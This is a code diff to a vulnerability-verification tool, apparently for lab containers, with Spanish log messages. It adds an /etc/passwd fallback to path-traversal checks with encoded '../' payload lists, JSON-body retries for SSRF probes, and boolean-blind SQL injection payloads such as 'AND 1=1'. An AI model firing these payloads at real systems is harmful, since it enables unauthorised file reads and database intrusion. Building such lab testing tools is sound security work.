@@ -1972,13 +1972,38 @@ def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
 
         for cmd in (setup_commands or []):
             step(f"ejecutando paso de configuracion real dentro del contenedor: {cmd!r}...")
-            r = lab.sh("exec", container, "sh", "-c", cmd, timeout=180)
-            if r.returncode != 0:
-                res.detail = (f"el paso de configuracion {cmd!r} fallo (codigo {r.returncode}): "
-                              f"{(r.stderr or r.stdout or '')[-500:]}")
-                res.logs.append(f"setup_commands[{cmd!r}] stdout/stderr:\n"
-                                f"{(r.stdout or '')}\n{(r.stderr or '')}")
-                return None
+            r = lab.sh("exec", container, "sh", "-c", cmd, timeout=240)
+            _cmd_out = (r.stdout or "") + (r.stderr or "")
+            _cmd_failed = r.returncode != 0
+            # Tolerate nonzero exit for commands that emit warnings but complete their task:
+            # Django `migrate` exits 1 on deprecation warnings yet runs all migrations.
+            # Ruby `bundle install` exits 1 when gems have optional deps missing.
+            # Node `npm install` exits 1 for peer dep warnings but installs packages.
+            # Strategy: if returncode != 0 but the output contains success indicators,
+            # treat it as a soft failure — log but continue.
+            _SUCCESS_INDICATORS = (
+                "successfully", "completed", "done", "installed", "migrated",
+                "0 errors", "no errors", "bundle complete", "added ", "packages",
+            )
+            _HARD_FAILURE_INDICATORS = (
+                "command not found", "no such file", "permission denied",
+                "fatal error", "cannot find module", "ModuleNotFoundError",
+                "SyntaxError", "ImportError", "Cannot open",
+            )
+            if _cmd_failed:
+                _out_lower = _cmd_out.lower()
+                _has_success = any(s in _out_lower for s in _SUCCESS_INDICATORS)
+                _has_fatal = any(s.lower() in _out_lower for s in _HARD_FAILURE_INDICATORS)
+                if _has_success and not _has_fatal:
+                    step(f"[WARN] setup_command {cmd!r} salio con codigo {r.returncode} pero "
+                         f"muestra indicadores de exito -- continuando (soft fail)")
+                    res.logs.append(f"setup_commands[{cmd!r}] soft-fail (rc={r.returncode}):\n"
+                                    f"{_cmd_out[-400:]}")
+                else:
+                    res.detail = (f"el paso de configuracion {cmd!r} fallo (codigo {r.returncode}): "
+                                  f"{_cmd_out[-500:]}")
+                    res.logs.append(f"setup_commands[{cmd!r}] stdout/stderr:\n{_cmd_out}")
+                    return None
 
         _lab_ok = True
         return (lab, base_url, container)
@@ -2368,9 +2393,21 @@ def verify_generic_path_traversal(
             pass
         step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
              f"propio contenedor del objetivo)...")
+        _canary_failed = False
         if not lab.write_canary(container, canary_path, secret):
-            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
-            return res
+            # Fallback 1: try /var/tmp/ instead of /tmp/ (some containers mount /tmp noexec)
+            _alt_canary = f"/var/tmp/binoracle_canary_{secret[:8]}"
+            step(f"canario en {canary_path} fallo — intentando /var/tmp/ como alternativa...")
+            if lab.write_canary(container, _alt_canary, secret):
+                canary_path = _alt_canary
+                rel = canary_path.lstrip("/")
+                step(f"canario plantado en {canary_path}")
+            else:
+                # Fallback 2: use /etc/passwd as the read target — no plant needed,
+                # check response for root:x:0:0: (always present on Linux containers)
+                step(f"planta de canario fallida — continuando en modo /etc/passwd "
+                     f"(sin canario propio; confirma traversal si root:x:0:0: aparece)")
+                _canary_failed = True
 
         rel = canary_path.lstrip("/")
         depths = (2, 4, 6, 8, 10, 12)
@@ -2417,6 +2454,19 @@ def verify_generic_path_traversal(
         attempts += [("%5C.." * n) + "%5C" + _rel_bs for n in depths]
         attempts += [rel + "%00", canary_path + "%00"]
 
+        # In passwd-mode, replace attempts with /etc/passwd traversal paths
+        if _canary_failed:
+            _etc = "etc/passwd"
+            _etc_abs = "/etc/passwd"
+            attempts = [_etc_abs, _etc]
+            attempts += [("../" * n) + _etc for n in (2, 4, 6, 8, 10, 12)]
+            attempts += [("..%2f" * n) + _etc for n in (2, 4, 6, 8, 10)]
+            attempts += [("%2e%2e%2f" * n) + _etc for n in (2, 4, 6, 8, 10)]
+            attempts += [("%252e%252e%252f" * n) + _etc for n in (2, 4, 6, 8)]
+            attempts += [("%2e%2e/" * n) + _etc for n in (2, 4, 6, 8)]
+            attempts += [(".%2e/" * n) + _etc for n in (2, 4, 6, 8)]
+            attempts += ["//" + _etc_abs, "/" + _etc_abs]
+
         found = False
         tried_all: list = []
         win_ep = endpoint or "/"
@@ -2459,32 +2509,54 @@ def verify_generic_path_traversal(
                 except Exception as e:
                     tried.append({"payload": payload_value, "error": str(e)})
                     continue
-                present = secret in (resp.text or "")
+                _resp_body = resp.text or ""
+                _PASSWD_RE = re.compile(r"root:[^:\n]*:0:0:")
+                if _canary_failed:
+                    # In passwd-mode: check for root:x:0:0: in response
+                    present = bool(_PASSWD_RE.search(_resp_body))
+                else:
+                    present = secret in _resp_body
                 tried.append({"payload": payload_value, "status": resp.status_code,
                               "secreto_presente": present,
-                              "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
+                              "respuesta_cuerpo_recorte": _resp_body[:300]})
                 if present:
                     found = True
                     win_ep, win_up, win_pp = cand_ep, cand_up, cand_path_p
                     res.evidence["payload_ganador"] = payload_value
                     res.evidence["status_code_respuesta"] = resp.status_code
-                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-                    step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
-                         f"{payload_desc}.")
-                    _shot_url = (base_url + cand_ep + payload_value) if cand_up else (base_url + cand_ep)
-                    _add_exploit_evidence(
-                        res=res, method=cand_meth, url=_shot_url,
-                        resp_or_body=resp,
-                        highlight=secret,
-                        caption_es=(f"PATH TRAVERSAL confirmado: {canary_path} devuelto por "
-                                    f"el servidor — secreto plantado visible en la respuesta."),
-                        caption_en=(f"PATH TRAVERSAL confirmed: {canary_path} returned by "
-                                    f"server — planted secret visible in response."),
-                        extra_terminal=(f"Canary: {canary_path}\n"
-                                        f"Secret: {secret}\n"
-                                        f"Payload: {payload_value}\n"
-                                        f"Response body:\n{(resp.text or '')[:400]}"),
-                    )
+                    res.evidence["respuesta_cuerpo_recorte"] = _resp_body[:500]
+                    if _canary_failed:
+                        step(f"VERIFICADO (modo /etc/passwd): root:x:0:0: visible en la "
+                             f"respuesta con {payload_desc}.")
+                        _shot_url = (base_url + cand_ep + payload_value) if cand_up else (base_url + cand_ep)
+                        _add_exploit_evidence(
+                            res=res, method=cand_meth, url=_shot_url,
+                            resp_or_body=resp,
+                            highlight="root:x:0:0:",
+                            caption_es=(f"PATH TRAVERSAL confirmado (via /etc/passwd): "
+                                        f"root:x:0:0: visible en la respuesta."),
+                            caption_en=(f"PATH TRAVERSAL confirmed (via /etc/passwd): "
+                                        f"root:x:0:0: visible in response."),
+                            extra_terminal=(f"Payload: {payload_value}\n"
+                                            f"Response body:\n{_resp_body[:400]}"),
+                        )
+                    else:
+                        step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
+                             f"{payload_desc}.")
+                        _shot_url = (base_url + cand_ep + payload_value) if cand_up else (base_url + cand_ep)
+                        _add_exploit_evidence(
+                            res=res, method=cand_meth, url=_shot_url,
+                            resp_or_body=resp,
+                            highlight=secret,
+                            caption_es=(f"PATH TRAVERSAL confirmado: {canary_path} devuelto por "
+                                        f"el servidor — secreto plantado visible en la respuesta."),
+                            caption_en=(f"PATH TRAVERSAL confirmed: {canary_path} returned by "
+                                        f"server — planted secret visible in response."),
+                            extra_terminal=(f"Canary: {canary_path}\n"
+                                            f"Secret: {secret}\n"
+                                            f"Payload: {payload_value}\n"
+                                            f"Response body:\n{_resp_body[:400]}"),
+                        )
                     step("captura HTTP guardada en el informe.")
                     break
             tried_all.extend(tried)
@@ -3144,20 +3216,46 @@ def verify_generic_ssrf(
             payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
             payload[url_param] = attempt_url
             entry = {"url": attempt_url, "token": token}
+            _resp_status = None
             try:
                 resp = _http_request(m, base_url + endpoint, timeout=15,
                                         data=payload if m != "GET" else None,
                                         params=payload if m == "GET" else None,
                                         headers=custom_headers or None)
-                entry["status"] = resp.status_code
+                _resp_status = resp.status_code
+                entry["status"] = _resp_status
                 if not first_resp_captured:
                     res.evidence["respuesta_cuerpo_recorte"] = (getattr(resp, "text", "") or "")[:500]
                     first_resp_captured = True
             except Exception as e:
                 entry["peticion_error"] = str(e)
-            time.sleep(2)
+            time.sleep(1)
             log = lab.listener_log()
             entry["token_en_log"] = token in log
+            # JSON body retry: if the form-encoded attempt got a 400/415 (or if any param key
+            # suggests JSON), retry with Content-Type: application/json and json= body. Many
+            # modern APIs (FastAPI, Django REST, Node.js) only accept JSON bodies and silently
+            # ignore form-encoded data, so the SSRF URL never reaches the server's HTTP client.
+            if not (token in log) and m != "GET":
+                _needs_json = (_resp_status in (400, 415) or
+                               endpoint.startswith("/api") or
+                               any("json" in str(k).lower() or "body" in str(k).lower()
+                                   for k in payload))
+                if _needs_json:
+                    try:
+                        _json_hdrs = dict(custom_headers or {})
+                        _json_hdrs["Content-Type"] = "application/json"
+                        resp_j = _http_request(m, base_url + endpoint, timeout=15,
+                                               json=payload,
+                                               headers=_json_hdrs)
+                        entry["status_json"] = resp_j.status_code
+                        time.sleep(1)
+                        log = lab.listener_log()
+                        if token in log:
+                            entry["token_en_log"] = True
+                            entry["via"] = "json-body"
+                    except Exception:
+                        pass
             tried.append(entry)
             if token in log:
                 found = True
@@ -3737,6 +3835,58 @@ def verify_generic_sqli_blind(
                     return res
             except Exception:
                 pass
+
+        # Boolean-blind differential: compare response LENGTH for TRUE vs FALSE conditions.
+        # Runs BEFORE time-based so WAF-protected or non-MySQL targets are covered without
+        # requiring SLEEP support. Only active when the control response is non-trivial (>10B)
+        # so that an empty-data response doesn't produce noisy length diffs.
+        try:
+            def _bool_send(val: str) -> Optional[int]:
+                payload = dict(base_params); payload[sqli_param] = val
+                try:
+                    r = _http_request(m, base_url + endpoint_path, timeout=15,
+                                      data=payload if m != "GET" else None,
+                                      params=payload if m == "GET" else None,
+                                      headers=custom_headers or None)
+                    return len(getattr(r, "text", "") or "")
+                except Exception:
+                    return None
+
+            _ctrl_len = _bool_send(orig_value)
+            if _ctrl_len is not None and _ctrl_len > 10:
+                _bool_pairs = [
+                    (f"{orig_value} AND 1=1", f"{orig_value} AND 1=2"),
+                    (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
+                    (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
+                ]
+                for _true_p, _false_p in _bool_pairs:
+                    _true_len = _bool_send(_true_p)
+                    _false_len = _bool_send(_false_p)
+                    if (_true_len is not None and _false_len is not None
+                            and abs(_true_len - _false_len) > 20
+                            and abs(_true_len - _ctrl_len) < 50):
+                        res.verified = True
+                        res.ok = True
+                        res.confidence = "probable"
+                        res.evidence.update({
+                            "tecnica": "generic-boolean-blind",
+                            "payload_true": _true_p,
+                            "payload_false": _false_p,
+                            "len_control": _ctrl_len,
+                            "len_true": _true_len,
+                            "len_false": _false_len,
+                            "diferencial": abs(_true_len - _false_len),
+                        })
+                        res.detail = (
+                            f"SQLI BOOLEAN-BLIND confirmada: '{sqli_param}' con TRUE={_true_p!r} "
+                            f"({_true_len}B) vs FALSE={_false_p!r} ({_false_len}B) -- diferencial "
+                            f"de {abs(_true_len - _false_len)}B mayor que el umbral de 20B"
+                        )
+                        step(f"VERIFICADO boolean-blind: diferencial {abs(_true_len - _false_len)}B "
+                             f"(TRUE={_true_len}B, FALSE={_false_len}B, control={_ctrl_len}B)")
+                        return res
+        except Exception as _bb_exc:
+            step(f"[warn] boolean-blind fallo, continuando con time-based: {_bb_exc!r:.80}")
 
         step("midiendo tiempos de respuesta de control (sin inyeccion)...")
         base_times = [t for t in (timed_send(orig_value, capture_body=True),
